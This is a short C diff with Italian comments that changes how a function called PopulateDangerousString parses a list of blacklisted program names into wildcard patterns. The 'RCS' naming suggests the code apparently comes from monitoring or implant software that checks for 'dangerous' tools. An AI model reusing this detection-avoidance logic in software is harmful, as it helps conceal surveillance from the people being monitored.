@@ -56,12 +56,17 @@ void PopulateDangerousString(rcs_struct_t *rcs_info)
 			_snwprintf_s(BLPrograms[bl_program_count], MAX_BL_PROGRAM_NAME, _TRUNCATE, L"%S", ptr);
 			BLPrograms[bl_program_count][0]=L'*'; // Toglie lo 0| che c'e' nel formato del file
 			BLPrograms[bl_program_count][1]=L'*';
-			// Toglie l'a capo finale e inserisce un altro *
-			if (w_ptr = wcschr(BLPrograms[bl_program_count], L'\r'))
-				*w_ptr = 0;
-			if (w_ptr = wcschr(BLPrograms[bl_program_count], L'\n'))
-				*w_ptr = 0;
-			_snwprintf_s(BLPrograms[bl_program_count], MAX_BL_PROGRAM_NAME, _TRUNCATE, L"%s*", BLPrograms[bl_program_count]);
+			BLPrograms[bl_program_count][3]=L'*';
+
+			if (BLPrograms[bl_program_count][2] == L'*') {
+				// Toglie l'a capo finale e inserisce un altro *
+				if (w_ptr = wcschr(BLPrograms[bl_program_count], L'\r'))
+					*w_ptr = 0;
+				if (w_ptr = wcschr(BLPrograms[bl_program_count], L'\n'))
+					*w_ptr = 0;
+				_snwprintf_s(BLPrograms[bl_program_count], MAX_BL_PROGRAM_NAME, _TRUNCATE, L"%s*", BLPrograms[bl_program_count]);
+			} else
+				_snwprintf_s(BLPrograms[bl_program_count], MAX_BL_PROGRAM_NAME, _TRUNCATE, L"XXXXXX----XXXXXXXX");
 
 			if (ptr = strchr(ptr, '\n')) 
 				ptr++;
